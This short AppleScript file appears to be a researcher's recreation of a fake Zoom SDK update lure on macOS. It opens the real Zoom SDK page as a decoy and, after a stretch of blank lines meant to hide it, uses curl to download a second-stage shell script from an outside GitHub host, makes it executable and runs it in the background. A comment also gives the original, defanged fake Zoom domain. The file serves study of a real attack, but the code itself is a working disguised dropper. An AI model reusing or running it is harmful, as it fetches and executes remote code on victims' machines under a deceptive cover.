-- Zoom SDK Update
-- Decoy: open official Zoom SDK page in the default web browser
-- my code just has the default browser for macOS, rather than the host's set default browser
open 'https://developer.zoom.us/docs/sdk/'

















-- [Over 10,000 blank lines inserted here to hide malicious content] --

-- Download the second-stage malicious payload (shell script) from the fake Zoom domain
-- This was theirs: hxxps[://]support[.]us05web-zoom[.]biz/troubleshoot-issue-727318
-- Mine uses my personal GitHub 

do shell script "curl -sL https://github.com/oliviagallucci/huntress-helper/blob/main/troubleshoot-issue-727318/zoom_payload.sh -o /tmp/zoom_payload.sh"

-- Make the downloaded script executable
do shell script "chmod +x /tmp/zoom_payload.sh"

-- Execute the second-stage script (runs in background)
do shell script "/tmp/zoom_payload.sh &"
